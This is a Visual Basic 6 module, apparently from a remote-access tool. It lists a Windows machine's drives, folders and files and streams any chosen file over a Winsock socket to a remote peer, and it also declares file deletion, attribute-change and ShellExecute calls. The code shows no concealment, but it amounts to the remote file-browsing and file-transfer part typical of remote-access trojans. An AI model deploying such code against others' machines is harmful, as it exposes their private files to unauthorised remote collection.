Attribute VB_Name = "ExplorerModule"
Option Explicit

''''''''''''''''''''''''GetLogicalDriveStrings''''''''''''''
'The GetLogicalDriveStrings function fills a buffer with _
'strings that specify valid drives in the system.
Public Declare Function GetLogicalDriveStrings Lib "kernel32" _
Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, _
ByVal lpBuffer As String) As Long
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''GetDriveType''''''''''''''''''''''''
Public Const DRIVE_CDROM = 5
Public Const DRIVE_FIXED = 3
Public Const DRIVE_RAMDISK = 6
Public Const DRIVE_REMOTE = 4
Public Const DRIVE_REMOVABLE = 2
'The GetDriveType function determines whether a disk drive _
'is a removable, fixed, CD-ROM, RAM disk, or network drive.
Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'The CreateDirectory function creates a new directory. _
 If the underlying file system supports security on files _
 and directories, the function applies a specified security _
 descriptor to the new directory. Note that CreateDirectory _
 does not have a template parameter, while _
 CreateDirectoryEx does.
Public Declare Function CreateDirectory Lib "kernel32" _
Alias "CreateDirectoryA" (ByVal lpPathName As String, _
lpSecurityAttributes As SECURITY_ATTRIBUTES) As Long
Public Type SECURITY_ATTRIBUTES
        nLength As Long
        lpSecurityDescriptor As Long
        bInheritHandle As Long
End Type
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'The ShellExecute function opens or prints a specified file. _
 The file can be an executable file or a document file.
Public Const SW_NORMAL = 1
Public Const SW_SHOWNORMAL = 1
Public Declare Function ShellExecute Lib "shell32.dll" Alias _
"ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, _
ByVal lpFile As String, ByVal lpParameters As String, _
ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'The DeleteFile function deletes an existing file.
Public Declare Function DeleteFile Lib "kernel32" Alias _
"DeleteFileA" (ByVal lpFileName As String) As Long
'The SetFileAttributes function sets a file’s attributes.
Public Const FILE_ATTRIBUTE_NORMAL = &H80
Public Declare Function SetFileAttributes Lib "kernel32" _
Alias "SetFileAttributesA" (ByVal lpFileName As String, _
ByVal dwFileAttributes As Long) As Long
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public CancelDownload As Boolean

Function DriveType(Drv As String) As String
Dim ret As Long

    ret = GetDriveType(Drv)
    Select Case ret
        Case DRIVE_CDROM
            DriveType = "CDROM"
        Case DRIVE_FIXED
            DriveType = "FIXED"
        Case DRIVE_RAMDISK
            DriveType = "RAMDISK"
        Case DRIVE_REMOTE
            DriveType = "REMOTE"
        Case DRIVE_REMOVABLE
            DriveType = "REMOVABLE"
    End Select
    
End Function

Function GetDrives() As String
Dim Drives As String, retVal As Long
Dim keer As Integer, str As String
    
    Drives = String(255, Chr(0))
    retVal& = GetLogicalDriveStrings(255, Drives)
    For keer = 1 To 100
        If Left(Drives, InStr(1, Drives, Chr(0))) = Chr(0) Then Exit For
        str = str & Left(Drives, InStr(1, Drives, Chr(0)) - 1) & "|" & DriveType(Left(Drives, InStr(1, Drives, Chr(0)) - 1)) & vbCrLf
        Drives = Right(Drives, Len(Drives) - InStr(1, Drives, Chr(0)))
    Next
    GetDrives = str
End Function

Function GetFolders(Fld As String) As String
Dim Explorer As New FileSystemObject
Dim thisFolder As Folder, allFolders As Folders
Dim txtData As String
On Error Resume Next
    Set Explorer = CreateObject("Scripting.FileSystemObject")
    Set thisFolder = Explorer.GetFolder(Fld)
    Set allFolders = thisFolder.SubFolders
    For Each thisFolder In allFolders
        txtData = txtData & thisFolder.Name & "#"
    Next
    GetFolders = txtData
End Function

Function GetFiles(Fld As String) As String
Dim Explorer As New FileSystemObject
Dim thisFolder As Folder
Dim Files As Files, File As File, txtData As String
On Error Resume Next
    Set Explorer = CreateObject("Scripting.FileSystemObject")
    Set thisFolder = Explorer.GetFolder(Fld)
    Set Files = thisFolder.Files
    For Each File In Files
        txtData = txtData & File.Name & "#"
    Next
    GetFiles = txtData
End Function

Sub DownloadFile(FilePath As String, Socket As Winsock)
Dim txtData As String, FileNumber As Integer
Dim Counter As Long, FileLength As Long
Dim SmallFile As Boolean

On Error GoTo LostConnection
    
    FileNumber = FreeFile()
    Open FilePath For Binary As #FileNumber
        FileLength = LOF(FileNumber)
        DoEvents
        Socket.SendData ("FileSize#" & FileLength & Chr(0))
        Sleep (5)
        txtData = String(512, " ")
        Get #FileNumber, 1, txtData
        Counter = Len(txtData)
        If FileLength > 512 Then
            SmallFile = False
        Else
            SmallFile = True
        End If
        Do While Counter <= FileLength
            If CancelDownload = True Then
                DoEvents
                Counter = FileLength
            End If
            DoEvents
            Socket.SendData ("DownloadFile#" & txtData)
            Sleep (5)
            txtData = String(512, " ")
            Get #FileNumber, Counter + 1, txtData
            If Counter + 512 > FileLength Then
                Dim tmplen As Long
                tmplen = FileLength - Counter
                If tmplen < 0 Then
                    txtData = Chr(0)
                Else
                    txtData = (Mid(txtData, 1, tmplen))
                End If
                Exit Do
            End If
            Counter = Counter + 512
        Loop
        
    Close #FileNumber
    
    DoEvents
    If SmallFile = True Then
        Socket.SendData ("DownloadFile#" & Mid(txtData, 1, FileLength))
    Else
        Socket.SendData ("DownloadFile#" & txtData)
    End If
    Sleep (5)
    DoEvents
    Socket.SendData ("DownloadComplete#" & Chr(0))
    Exit Sub
LostConnection:
End Sub

